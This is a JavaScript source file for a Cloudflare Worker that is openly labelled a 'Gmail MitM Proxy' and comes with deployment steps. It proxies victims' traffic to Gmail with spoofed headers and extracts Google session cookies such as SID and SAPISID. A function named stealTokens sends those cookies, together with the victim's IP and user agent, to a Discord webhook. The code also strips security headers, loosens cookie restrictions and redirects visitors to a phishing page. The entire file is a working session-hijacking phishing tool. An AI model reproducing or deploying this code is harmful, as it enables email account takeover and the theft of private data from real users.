// Gmail MitM Proxy v2.1 - PRODUCTION PENTEST READY
// Header Spoofing + Token Theft + Session Hijack + OpSec + Rate Limiting
// Deploy: https://dash.cloudflare.com → Workers → Create → Paste → Deploy

const WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR-WEBHOOK-ID-HERE'; // ← REPLACE!

// Rate limiting state
const RATE_LIMIT = new Map();

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);
  const clientIP = request.headers.get('CF-Connecting-IP') || 'unknown';
  const userAgent = request.headers.get('User-Agent')?.substring(0, 200) || 'unknown';

  // Rate limit: 100 reqs/hour per IP
  const now = Date.now();
  const key = `rate_${clientIP}`;
  let hits = RATE_LIMIT.get(key) || [];
  hits = hits.filter(t => now - t < 3600000);
  if (hits.length > 100) {
    return new Response('Too Many Requests', { status: 429 });
  }
  hits.push(now);
  RATE_LIMIT.set(key, hits);

  // PROXY GMAIL PATHS + internals
  const proxyPaths = [
    '/mail/', '/static/', '/chrome/', '/mail/u/', '/sync/', '/accounts/',
    '/serviceworker/', '/_/', '/s/i/', '/mail/client/'
  ];
  
  if (proxyPaths.some(path => url.pathname.startsWith(path)) || url.pathname === '/') {
    // Default to inbox for root path
    if (url.pathname === '/') url.pathname = '/mail/u/0/#inbox';
    return await proxyGmail(url, request, clientIP, userAgent);
  }

  // LANDING REDIRECT
  return Response.redirect('https://ia7353038-crypto.github.io/nINE-phish/', 302);
}

async function proxyGmail(url, request, clientIP, userAgent) {
  const headers = new Headers(request.headers);
  headers.set('Host', 'mail.google.com');
  headers.set('Origin', 'https://mail.google.com');
  headers.set('Referer', 'https://mail.google.com/mail/u/0/#inbox');
  headers.set('Sec-Fetch-Site', 'same-origin');
  headers.set('Sec-Fetch-Mode', 'navigate');
  headers.set('Sec-Fetch-Dest', 'document');
  headers.set('Sec-Fetch-User', '?1');
  headers.set('Upgrade-Insecure-Requests', '1');

  url.hostname = 'mail.google.com';
  url.protocol = 'https:';

  const proxyReq = new Request(url, {
    method: request.method,
    headers,
    body: request.body,
    redirect: 'follow'
  });

  try {
    const response = await fetch(proxyReq);
    const tokens = extractTokens(response.headers.getAll('Set-Cookie') || []);

    if (tokens.length > 0) {
      await stealTokens(tokens, clientIP, userAgent, request.url);
    }

    return craftResponse(response);
  } catch (error) {
    return new Response(`Proxy Error: ${error.message}`, { status: 502 });
  }
}

function extractTokens(cookies) {
  const regexes = [
    /(SID|HSID|SSID|APISID|SAPISID|__Secure-3PSID|GAPS|G_authuser|OAuthToken)=([^;,\s]+)/gi,
    /gmail\.com=[^;,\s]+/gi,
    /__Host-user_auth_[^=]+=[^;,\s]+/gi
  ];
  
  const tokens = [];
  cookies.forEach(cookieStr => {
    regexes.forEach(regex => {
      let match;
      while (match = regex.exec(cookieStr)) {
        tokens.push({ name: match[1] || 'auth', value: match[2] });
      }
    });
  });
  return [...new Set(tokens.map(t => JSON.stringify(t)))].map(JSON.parse);
}

async function stealTokens(tokens, ip, ua, url) {
  const shortUA = ua.length > 100 ? ua.substring(0, 97) + '...' : ua;
  const tokenPreview = tokens.slice(0, 5).map(t => 
    `\`${t.name}\`: ${t.value.slice(0,20)}...`
  ).join('\n');
  
  const payload = {
    username: 'Gmail Proxy',
    avatar_url: 'https://mail.google.com/mail/u/0/images/favicon5.ico',
    embeds: [{
      title: `🔒 ${tokens.length} Gmail Token(s)`,
      description: `**IP:** \`${ip}\`\n**UA:** ${shortUA}\n**Path:** ${new URL(url).pathname}`,
      fields: [{ name: 'Tokens', value: tokenPreview || 'None readable', inline: false }],
      color: tokens.some(t => t.name.includes('SID')) ? 0x00ff00 : 0xffaa00,
      timestamp: new Date().toISOString()
    }]
  };

  fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  }).catch(() => {});

  console.log(`PHISH HIT: ${ip} | ${tokens.map(t => t.name).join(',')}`);
}

function craftResponse(response) {
  const headers = new Headers(response.headers);
  
  // BYPASS SECURITY HEADERS
  headers.delete('Content-Security-Policy');
  headers.delete('Content-Security-Policy-Report-Only');
  headers.delete('X-Frame-Options');
  headers.delete('Strict-Transport-Security');
  
  // CORS
  headers.set('Access-Control-Allow-Origin', '*');
  headers.set('Access-Control-Allow-Credentials', 'true');
  
  // FIX COOKIE HANDLING (CRITICAL)
  const cookies = headers.getAll('Set-Cookie') || [];
  headers.delete('Set-Cookie');
  
  cookies.forEach(cookie => {
    const relaxed = cookie
      .replace(/SameSite=(Strict|Lax)/gi, 'SameSite=None; Secure')
      .replace(/Domain=[^;]*/gi, 'Domain=mail.google.com');
    headers.append('Set-Cookie', relaxed);
  });

  return new Response(response.body, {
    status: response.status,
    headers
  });
}
